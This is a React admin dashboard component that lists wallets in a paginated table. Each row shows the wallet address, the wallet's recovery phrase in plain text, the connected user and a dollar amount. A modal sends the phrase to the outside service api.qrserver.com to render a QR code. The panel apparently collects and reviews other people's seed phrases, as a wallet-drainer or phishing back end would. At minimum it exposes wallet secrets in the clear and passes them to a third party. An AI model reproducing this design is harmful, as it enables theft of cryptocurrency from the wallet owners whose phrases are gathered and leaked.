import React, { useEffect, useState } from 'react';
import { getWallets } from '../services/Constant';

function WalletsScreen() {
  const [data, setdata] = useState([]);
  const [currentPage, setCurrentPage] = useState(1);
  const [qrData, setQrData] = useState(null)
  const pageSize = 10;

  useEffect(() => {
    getData();
  }, []);

  const getData = async () => {
    let res = await fetch(getWallets, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
    });
    let result = await res.json();
    console.log(result);
    setdata(result.data);
  };

  const formatCustomDate = (dateString) => {
    const date = new Date(dateString);
    const options = {
      year: 'numeric',
      month: 'long',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    };
    return new Intl.DateTimeFormat('en-GB', options).format(date);
  };

  const totalPages = Math.ceil(data.length / pageSize);
  const currentData = data.slice((currentPage - 1) * pageSize, currentPage * pageSize);

  const getPagination = () => {
    const pages = [];
    const sibling = 1;

    const left = Math.max(currentPage - sibling, 1);
    const right = Math.min(currentPage + sibling, totalPages);

    if (left > 2) pages.push(1, '...');
    else for (let i = 1; i < left; i++) pages.push(i);

    for (let i = left; i <= right; i++) pages.push(i);

    if (right < totalPages - 1) pages.push('...', totalPages);
    else for (let i = right + 1; i <= totalPages; i++) pages.push(i);

    return pages;
  };

  return (
    <div className="main-panel">
      <div className="content-wrapper">
        <div className="row">
          <div className="col-12 grid-margin">
            <div className="card">
              <div className="card-body">
                <h4 className="card-title">Wallets</h4>
                <div className="table-responsive">
                  <table className="table">
                    <thead>
                      <tr className="text-center">
                        <th> S.No </th>
                        <th> Wallet Address </th>
                        <th> Phrases </th>
                        <th> Connected User </th>
                        <th> Amount </th>
                        <th> Date </th>
                      </tr>
                    </thead>
                    <tbody>
                      {currentData.length > 0 ? (
                        currentData.map((item, i) => (
                          <tr key={i} className="text-center">
                            <td>{(currentPage - 1) * pageSize + i + 1}</td>
                            <td>
                              <span className="text-wrap text-break d-block w-100 small">
                                {item?.walletAddress}
                              </span>
                            </td>
                            <td>
                              <span className="text-wrap text-break d-block w-100 small text-success" data-bs-toggle="modal" data-bs-target="#qrModal" onClick={() => setQrData(item)}>
                                {item?.phrases?.[0]}
                              </span>
                            </td>
                            <td>{item?.userId?.userId}</td>
                            <td className="text-success">
                              $ {item?.amount?.toFixed(2) || 0}
                            </td>
                            <td>{formatCustomDate(item?.createdAt)}</td>
                          </tr>
                        ))
                      ) : (
                        <tr className="text-center">
                          <td colSpan={6}>No data found</td>
                        </tr>
                      )}
                    </tbody>
                  </table>
                </div>

                {/* Pagination */}
                <div className="d-flex justify-content-between align-items-center mt-3 flex-wrap">
                  <button
                    className="btn btn-outline-primary btn-sm"
                    onClick={() => setCurrentPage((prev) => Math.max(prev - 1, 1))}
                    disabled={currentPage === 1}
                  >
                    Previous
                  </button>

                  <div className="d-flex gap-1 flex-wrap">
                    {getPagination().map((pg, index) => (
                      <button
                        key={index}
                        className={`btn btn-sm ${
                          pg === currentPage ? 'btn-primary' : 'btn-outline-secondary'
                        }`}
                        onClick={() => typeof pg === 'number' && setCurrentPage(pg)}
                        disabled={pg === '...'}
                      >
                        {pg}
                      </button>
                    ))}
                  </div>

                  <button
                    className="btn btn-outline-primary btn-sm"
                    onClick={() => setCurrentPage((prev) => Math.min(prev + 1, totalPages))}
                    disabled={currentPage === totalPages}
                  >
                    Next
                  </button>
                </div>
                {/* End Pagination */}
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="modal fade" id="qrModal" tabIndex="-1" aria-labelledby="qrModalLabel" aria-hidden="true">
                  <div className="modal-dialog modal-dialog-centered">
                    <div className="modal-content">
                      <div className="modal-header">
                        <h5 className="modal-title" id="qrModalLabel">Wallet QR Code User Id: <strong className='text-warning'>{qrData?.userId?.userId}</strong></h5>
                        <button type="button" className="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                      </div>
                      <div className="modal-body text-center">
                        <img
                          src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${qrData?.phrases?.[0]}`}
                          alt="QR Code"
                          style={{ height: "150px", width: "150px" }}
                        />
                        <p className="mt-2" style={{ wordBreak: "break-all", whiteSpace: "normal" }}><strong>Phrases:</strong> {qrData?.phrases?.[0]}</p>
                      </div>
                    </div>
                  </div>
                </div>
    </div>
  );
}

export default WalletsScreen;
